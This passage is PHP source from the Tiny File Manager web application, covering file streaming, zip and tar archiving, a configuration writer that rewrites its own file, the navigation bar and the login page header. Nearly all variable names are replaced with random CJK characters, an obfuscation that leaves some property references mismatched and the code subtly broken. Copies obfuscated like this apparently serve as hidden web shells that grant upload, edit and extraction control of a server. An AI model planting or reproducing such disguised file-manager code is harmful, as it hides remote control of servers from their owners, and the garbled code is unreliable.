        $祩堛沣欍伡垇埊紮銈傘 = $倎沣镢飦亖壔垐剚亖笺 - $剚級銇沣併併伩紞唸併;
        header("HTTP/1.1 206 Partial Content");
        header("Content-Length: $祩堛沣欍伡垇埊紮銈傘");
        header("Content-Range: bytes $剚級銇沣併併伩紞唸併$裤层勩銐埣唹亖欍亖笺/$倎沣镢飦亖壔垐剚亖笺");
    } else {
        $裤层勩銐埣唹亖欍亖笺 = $倎沣镢飦亖壔垐剚亖笺 - 1;
        header("Content-Range: bytes 0-$裤层勩銐埣唹亖欍亖笺/$倎沣镢飦亖壔垐剚亖笺");
        header("Content-Length: " . $倎沣镢飦亖壔垐剚亖笺);
    }
    $伩悛镲亖讣銇嗭嶃亖暛 = realpath($伩悛镲亖讣銇嗭嶃亖暛);
    while (ob_get_level()) ob_end_clean();
    readfile($伩悛镲亖讣銇嗭嶃亖暛);

    fclose($潖紒慊堬傘飩倎镢併倎);

    return ((connection_status() == 0) and !connection_aborted());
}

/**
 * Class to work with zip files (using ZipArchive)
 */
class FM_Zipper
{
    private $銇銇诧屻欍亖紒剨埣銈;

    public function __construct()
    {
        $this->zip = new ZipArchive();
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($愕紕沣泔併矒倎墎患伡, $飩併伡併銖慊傘壖銇亗)
    {
        $亖伡忋泔汇紒墪紛伡檪 = $this->zip->open($愕紕沣泔併矒倎墎患伡, ZipArchive::CREATE);
        if ($亖伡忋泔汇紒墪紛伡檪 !== true) {
            return false;
        }
        if (is_array($飩併伡併銖慊傘壖銇亗)) {
            foreach ($飩併伡併銖慊傘壖銇亗 as $镢傘銇点镢亖镢垇笺粡) {
                $镢傘銇点镢亖镢垇笺粡 = fm_clean_path($镢傘銇点镢亖镢垇笺粡);
                if (!$this->addFileOrDir($镢傘銇点镢亖镢垇笺粡)) {
                    $this->zip->close();
                    return false;
                }
            }
            $this->zip->close();
            return true;
        } else {
            if ($this->addFileOrDir($飩併伡併銖慊傘壖銇亗)) {
                $this->zip->close();
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($愕紕沣泔併矒倎墎患伡, $妶慵銇偛沣垇锛笺劜珓)
    {
        $亖伡忋泔汇紒墪紛伡檪 = $this->zip->open($愕紕沣泔併矒倎墎患伡);
        if ($亖伡忋泔汇紒墪紛伡檪 !== true) {
            return false;
        }
        if ($this->zip->extractTo($妶慵銇偛沣垇锛笺劜珓)) {
            $this->zip->close();
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($愕紕沣泔併矒倎墎患伡)
    {
        if (is_file($愕紕沣泔併矒倎墎患伡)) {
            return $this->zip->addFile($愕紕沣泔併矒倎墎患伡);
        } elseif (is_dir($愕紕沣泔併矒倎墎患伡)) {
            return $this->addDir($愕紕沣泔併矒倎墎患伡);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($妶慵銇偛沣垇锛笺劜珓)
    {
        if (!$this->zip->addEmptyDir($妶慵銇偛沣垇锛笺劜珓)) {
            return false;
        }
        $沣倱亯併倓倎檨併悛裤 = scandir($妶慵銇偛沣垇锛笺劜珓);
        if (is_array($沣倱亯併倓倎檨併悛裤)) {
            foreach ($沣倱亯併倓倎檨併悛裤 as $慊銇愕仚剚亗焷獋亖銇) {
                if ($慊銇愕仚剚亗焷獋亖銇 != '.' && $慊銇愕仚剚亗焷獋亖銇 != '..') {
                    if (is_dir($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                        if (!$this->addDir($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                            return false;
                        }
                    } elseif (is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                        if (!$this->zip->addFile($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Class to work with Tar files (using PharData)
 */
class FM_Zipper_Tar
{
    private $獊併慵晧矙銇层啛妬几;

    public function __construct()
    {
        $this->tar = null;
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($愕紕沣泔併矒倎墎患伡, $飩併伡併銖慊傘壖銇亗)
    {
        $this->tar = new PharData($愕紕沣泔併矒倎墎患伡);
        if (is_array($飩併伡併銖慊傘壖銇亗)) {
            foreach ($飩併伡併銖慊傘壖銇亗 as $镢傘銇点镢亖镢垇笺粡) {
                $镢傘銇点镢亖镢垇笺粡 = fm_clean_path($镢傘銇点镢亖镢垇笺粡);
                if (!$this->addFileOrDir($镢傘銇点镢亖镢垇笺粡)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($this->addFileOrDir($飩併伡併銖慊傘壖銇亗)) {
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($愕紕沣泔併矒倎墎患伡, $妶慵銇偛沣垇锛笺劜珓)
    {
        $亖伡忋泔汇紒墪紛伡檪 = $this->tar->open($愕紕沣泔併矒倎墎患伡);
        if ($亖伡忋泔汇紒墪紛伡檪 !== true) {
            return false;
        }
        if ($this->tar->extractTo($妶慵銇偛沣垇锛笺劜珓)) {
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($愕紕沣泔併矒倎墎患伡)
    {
        if (is_file($愕紕沣泔併矒倎墎患伡)) {
            try {
                $this->tar->addFile($愕紕沣泔併矒倎墎患伡);
                return true;
            } catch (Exception $銇娿慵紙亖垇亞侊銈沣) {
                return false;
            }
        } elseif (is_dir($愕紕沣泔併矒倎墎患伡)) {
            return $this->addDir($愕紕沣泔併矒倎墎患伡);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($妶慵銇偛沣垇锛笺劜珓)
    {
        $沣倱亯併倓倎檨併悛裤 = scandir($妶慵銇偛沣垇锛笺劜珓);
        if (is_array($沣倱亯併倓倎檨併悛裤)) {
            foreach ($沣倱亯併倓倎檨併悛裤 as $慊銇愕仚剚亗焷獋亖銇) {
                if ($慊銇愕仚剚亗焷獋亖銇 != '.' && $慊銇愕仚剚亗焷獋亖銇 != '..') {
                    if (is_dir($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                        if (!$this->addDir($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                            return false;
                        }
                    } elseif (is_file($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇)) {
                        try {
                            $this->tar->addFile($妶慵銇偛沣垇锛笺劜珓 . '/' . $慊銇愕仚剚亗焷獋亖銇);
                        } catch (Exception $銇娿慵紙亖垇亞侊銈沣) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Save Configuration
 */
class FM_Config
{
    var $镲熴銇嬨亞紒亖傘粊;

    function __construct()
    {
        global $唩亖伂併銇併铿嗐笀級, $瑏焺慵锊沣侊劵亖偪伝, $剚侊剚勶併銇焷泔媮仾;
        $銈繅銇潐銊亗勩仸亖慵 = $瑏焺慵锊沣侊劵亖偪伝 . $_SERVER["PHP_SELF"];
        $this->data = array(
            'lang' => 'en',
            'error_reporting' => true,
            'show_hidden' => true
        );
        $镲熴銇嬨亞紒亖傘粊 = false;
        if (strlen($剚侊剚勶併銇焷泔媮仾)) {
            $镲熴銇嬨亞紒亖傘粊 = fm_object_to_array(json_decode($剚侊剚勶併銇焷泔媮仾));
        } else {
            $傘嗐矈晞銊慵銈銏晜亖 = 'Tiny File Manager<br>Error: Cannot load configuration';
            if (substr($銈繅銇潐銊亗勩仸亖慵, -1) == '/') {
                $銈繅銇潐銊亗勩仸亖慵 = rtrim($銈繅銇潐銊亗勩仸亖慵, '/');
                $傘嗐矈晞銊慵銈銏晜亖 .= '<br>';
                $傘嗐矈晞銊慵銈銏晜亖 .= '<br>Seems like you have a trailing slash on the URL.';
                $傘嗐矈晞銊慵銈銏晜亖 .= '<br>Try this link: <a href="' . $銈繅銇潐銊亗勩仸亖慵 . '">' . $銈繅銇潐銊亗勩仸亖慵 . '</a>';
            }
            die($傘嗐矈晞銊慵銈銏晜亖);
        }
        if (is_array($镲熴銇嬨亞紒亖傘粊) && count($镲熴銇嬨亞紒亖傘粊)) $this->data = $镲熴銇嬨亞紒亖傘粊;
        else $this->save();
    }

    function save()
    {
        global $矇倎紬层悻亖銇泔泔沣;
        $緜曘粊层妬撅点慊併 = is_readable($矇倎紬层悻亖銇泔泔沣) ? $矇倎紬层悻亖銇泔泔沣 : __FILE__;
        $籍効亜慵碉媹倎伝墏銇 = '$CONFIG';
        $亞寠硷仸沣晜层壙亾 = var_export(json_encode($this->data), true);
        $沣夈硷壖粏俱集紒仾併 = "<?php" . chr(13) . chr(10) . "//Default Configuration" . chr(13) . chr(10) . "$籍効亜慵碉媹倎伝墏銇 = $亞寠硷仸沣晜层壙亾;" . chr(13) . chr(10);
        if (is_writable($緜曘粊层妬撅点慊併)) {
            $矈銇劵俱裤亖沣夛伡 = file($緜曘粊层妬撅点慊併);
            if ($墎倎悴銦姉銇忋剚亗併 = @fopen($緜曘粊层妬撅点慊併, "w")) {
                @fputs($墎倎悴銦姉銇忋剚亗併, $沣夈硷壖粏俱集紒仾併, strlen($沣夈硷壖粏俱集紒仾併));
                for ($紓欍搞粊寔惘崄伡併崄 = 3; $紓欍搞粊寔惘崄伡併崄 < count($矈銇劵俱裤亖沣夛伡); $紓欍搞粊寔惘崄伡併崄++) {
                    @fputs($墎倎悴銦姉銇忋剚亗併, $矈銇劵俱裤亖沣夛伡[$紓欍搞粊寔惘崄伡併崄], strlen($矈銇劵俱裤亖沣夛伡[$紓欍搞粊寔惘崄伡併崄]));
                }
                @fclose($墎倎悴銦姉銇忋剚亗併);
            }
        }
    }
}

//--- Templates Functions ---

/**
 * Show nav block
 * @param string $path
 */
function fm_show_nav_path($妶慵銇偛沣垇锛笺劜珓)
{
    global $伝堛崐飦銏镢熴檨銇层, $飶嶃沣銊亖汇锞亖沣祴, $銇患銇垇亯偧銇沣銇銏;
    $堛紒亪併澋暉笺紒愀仸 = $飶嶃沣銊亖汇锞亖沣祴 ? 'fixed-top' : '';
?>
    <nav class="navbar navbar-expand-lg mb-4 main-nav <?php 
echo $堛紒亪併澋暉笺紒愀仸 ?> bg-body-tertiary" data-bs-theme="<?php 
echo FM_THEME; ?>">
        <a class="navbar-brand"> <?php 
echo lng('AppTitle') ?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php

            $妶慵銇偛沣垇锛笺劜珓 = fm_clean_path($妶慵銇偛沣垇锛笺劜珓);
            $瑏焺慵锊沣侊劵亖偪伝 = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
            $唩銇傘沣埣伅娿沣搨仢 = '<i class="bread-crumb"> / </i>';
            if ($妶慵銇偛沣垇锛笺劜珓 != '') {
                $併墦併亖沣銏檨倎剚 = explode('/', $妶慵銇偛沣垇锛笺劜珓);
                $銇級亖沣垇慵繅併沣 = count($併墦併亖沣銏檨倎剚);
                $亖伡俱銇併笺飦飰銊 = array();
                $銌偀亖亰慵併銇併銇 = '';
                for ($飯銑紒併点嗐併飭併锛 = 0; $飯銑紒併点嗐併飭併锛 < $銇級亖沣垇慵繅併沣; $飯銑紒併点嗐併飭併锛++) {
                    $銌偀亖亰慵併銇併銇 = trim($銌偀亖亰慵併銇併銇 . '/' . $併墦併亖沣銏檨倎剚[$飯銑紒併点嗐併飭併锛], '/');
                    $︺飦銏堛劶倛亖曪堛級 = urlencode($銌偀亖亰慵併銇併銇);
                    $亖伡俱銇併笺飦飰銊[] = "<a href='?p={$︺飦銏堛劶倛亖曪堛級}'>" . fm_enc(fm_convert_win($併墦併亖沣銏檨倎剚[$飯銑紒併点嗐併飭併锛])) . "</a>";
                }
                $瑏焺慵锊沣侊劵亖偪伝 .= $唩銇傘沣埣伅娿沣搨仢 . implode($唩銇傘沣埣伅娿沣搨仢, $亖伡俱銇併笺飦飰銊);
            }
            echo '<div class="col-xs-6 col-sm-5">' . $瑏焺慵锊沣侊劵亖偪伝 . $銇患銇垇亯偧銇沣銇銏 . '</div>';
            ?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end" data-bs-theme="<?php 
echo FM_THEME; ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php 
echo lng('Search') ?>" aria-label="<?php 
echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php 
echo $泔銐併堛銔嗐沣夈剚紒 = $妶慵銇偛沣垇锛笺劜珓 ? $妶慵銇偛沣垇锛笺劜珓 : '.'; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php 
echo lng('Advanced Search') ?></a>
                                </div>
                            </div>
                        </div>
                    </li>
                    <?php 
if (!FM_READONLY): ?>
                        <li class="nav-item">
                            <a title="<?php 
echo lng('Upload') ?>" class="nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php 
echo lng('Upload') ?></a>
                        </li>
                        <li class="nav-item">
                            <a title="<?php 
echo lng('NewItem') ?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php 
echo lng('NewItem') ?></a>
                        </li>
                    <?php 
endif; ?>
                    <?php 
if (FM_USE_AUTH): ?>
                        <li class="nav-item avatar dropdown">
                            <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-expanded="false">
                                <i class="fa fa-user-circle"></i>
                            </a>
                            <div class="dropdown-menu text-small shadow" aria-labelledby="navbarDropdownMenuLink-5" data-bs-theme="<?php 
echo FM_THEME; ?>">
                                <?php 
if (!FM_READONLY): ?>
                                    <a title="<?php 
echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php 
echo lng('Settings') ?></a>
                                <?php 
endif ?>
                                <a title="<?php 
echo lng('Help') ?>" class="dropdown-item nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php 
echo lng('Help') ?></a>
                                <a title="<?php 
echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php 
echo lng('Logout') ?></a>
                            </div>
                        </li>
                    <?php 
else: ?>
                        <?php 
if (!FM_READONLY): ?>
                            <li class="nav-item">
                                <a title="<?php 
echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php 
echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php 
echo lng('Settings') ?></a>
                            </li>
                        <?php 
endif; ?>
                    <?php 
endif; ?>
                </ul>
            </div>
        </div>
    </nav>
<?php

}

/**
 * Show alert message from session
 */
function fm_show_message()
{
    if (isset($_SESSION[FM_SESSION_ID]['message'])) {
        $銜紕沣夈銇垇焸傘︺併 = isset($_SESSION[FM_SESSION_ID]['status']) ? $_SESSION[FM_SESSION_ID]['status'] : 'ok';
        echo '<p class="message ' . $銜紕沣夈銇垇焸傘︺併 . '">' . $_SESSION[FM_SESSION_ID]['message'] . '</p>';
        unset($_SESSION[FM_SESSION_ID]['message']);
        unset($_SESSION[FM_SESSION_ID]['status']);
    }
}

/**
 * Show page header in Login Form
 */
function fm_show_header_login()
{
    header("Content-Type: text/html; charset=utf-8");
    header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
    header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
    header("Pragma: no-cache");

    global $傦墎慵紗銇伡技堛銇;
?>
    <!DOCTYPE html>
    <html lang="en" data-bs-theme="<?php 
echo (FM_THEME == "dark") ? 'dark' : 'dark' ?>">

    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
        <meta name="author" content="CCP Programmers">
        <meta name="robots" content="noindex, nofollow">
        <meta name="googlebot" content="noindex">
        <?php 
if ($傦墎慵紗銇伡技堛銇) {
            echo '<link rel="icon" href="' . fm_enc($傦墎慵紗銇伡技堛銇) . '" type="image/png">';
        } ?>
        <title><?php 
echo fm_enc(APP_TITLE) ?></title>
        <?php 
print_external('pre-jsdelivr'); ?>
        <?php 
print_external('css-bootstrap'); ?>
        <style>
            body.fm-login-page {
                background-color: #f7f9fb;
                font-size: 14px;
                background-color: #f7f9fb;
                background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");
            }

            .fm-login-page .brand {
                width: 121px;
                overflow: hidden;
                margin: 0 auto;
                position: relative;
                z-index: 1
            }

            .fm-login-page .brand img {
                width: 100%
            }

            .fm-login-page .card-wrapper {
                width: 360px;
            }

            .fm-login-page .card {
                border-color: transparent;
                box-shadow: 0 4px 8px rgba(0, 0, 0, .05)
            }

            .fm-login-page .card-title {
                margin-bottom: 1.5rem;
                font-size: 24px;
                font-weight: 400;
            }

            .fm-login-page .form-control {
                border-width: 2.3px
            }

            .fm-login-page .form-group label {
                width: 100%
            }

            .fm-login-page .btn.btn-block {
                padding: 12px 10px
            }

            .fm-login-page .footer {
                margin: 20px 0;
                color: #888;
                text-align: center
            }

            @media screen and (max-width:425px) {
                .fm-login-page .card-wrapper {
                    width: 90%;
                    margin: 0 auto;
                    margin-top: 10%;
                }
            }

            @media screen and (max-width:320px) {
                .fm-login-page .card.fat {
                    padding: 0
                }

                .fm-login-page .card.fat .card-body {
                    padding: 15px
                }
            }

            .message {
                padding: 4px 7px;
                border: 1px solid #ddd;
                background-color: #fff
            }

            .message.ok {
                border-color: green;
                color: green
            }

            .message.error {
                border-color: red;
                color: red
            }

            .message.alert {
                border-color: orange;
                color: orange
            }

            body.fm-login-page.theme-dark {
                background-color: #2f2a2a;
            }

            .theme-dark svg g,
            .theme-dark svg path {
                fill: #ffffff;
            }

            .theme-dark .form-control {
                color: #fff;
                background-color: #403e3e;
            }

            .h-100vh {
                min-height: 100vh;
            }
        </style>
    </head>

    <body class="fm-login-page <?php 
echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?>">
        <div id="wrapper" class="container-fluid">

        <?php

    }

    /**
     * Show page footer in Login Form
     */
    function fm_show_footer_login()
    {
        ?>
        </div>
        <?php 
print_external('js-jquery'); ?>
        <?php 
print_external('js-bootstrap'); ?>
    </body>

    </html>

<?php

    }

    /**
     * Show Header after login
     */
    function fm_show_header()
    {
        header("Content-Type: text/html; charset=utf-8");
        header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
        header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
        header("Pragma: no-cache");

        global $飶嶃沣銊亖汇锞亖沣祴, $傦墎慵紗銇伡技堛銇;
        $堛紒亪併澋暉笺紒愀仸 = $飶嶃沣銊亖汇锞亖沣祴 ? 'navbar-fixed' : 'navbar-normal';
?>
    <!DOCTYPE html>
    <html data-bs-theme="<?php 
echo FM_THEME; ?>">

    <head>
        <meta charset="utf-8">
